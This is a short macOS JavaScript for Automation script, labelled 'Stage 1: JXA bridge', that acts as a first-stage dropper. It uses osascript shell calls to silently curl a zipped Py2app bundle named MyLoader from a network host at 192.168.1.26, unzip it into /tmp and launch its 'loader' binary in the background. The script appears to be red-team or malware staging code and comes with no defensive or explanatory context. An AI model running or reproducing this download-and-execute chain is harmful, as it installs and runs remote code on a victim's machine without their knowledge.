// Stage 1: JXA bridge (run via osascript -l JavaScript)
var app = Application.currentApplication();
app.includeStandardAdditions = true;

// Remote Py2app bundle location
var url = "http://192.168.1.26/MyLoader.app.zip";
var localZip = "/tmp/MyLoader.app.zip";

// Download Py2app bundle
app.doShellScript("curl -s -o " + localZip + " " + url);

// Unzip into /tmp
app.doShellScript("unzip -o " + localZip + " -d /tmp/");

// Launch the Py2app loader in background
app.doShellScript("/tmp/MyLoader.app/Contents/MacOS/loader &");
